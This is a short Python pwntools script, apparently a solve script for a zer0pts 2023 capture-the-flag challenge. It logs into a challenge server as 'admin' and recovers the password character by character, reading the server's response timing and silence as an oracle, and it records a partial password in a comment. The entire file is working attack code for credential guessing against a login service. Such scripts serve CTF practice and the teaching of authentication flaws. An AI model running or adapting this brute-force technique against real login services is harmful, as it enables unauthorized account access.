#!/usr/bin/env python3

from pwn import *
import string

def try_prefix(pwd):
    host = remote('misc2.2023.zer0pts.com', '10021')

    host.recvuntil(b'Username: ')
    host.sendline(b'admin')
    host.recvuntil(b'Password: ')
    host.send(pwd.encode('ascii'))
    return len(host.recv(timeout=0.1)) == 0

# dd79efc4093c9326
cur = 'dd79efc4093c9326'

while True:
    found = False
    for c in string.printable:
        if try_prefix(cur + c):
            cur += c
            print('current prefix:', cur)
            found = True
            break
    if not found:
        print('done!')
        print('password:', cur)
        break
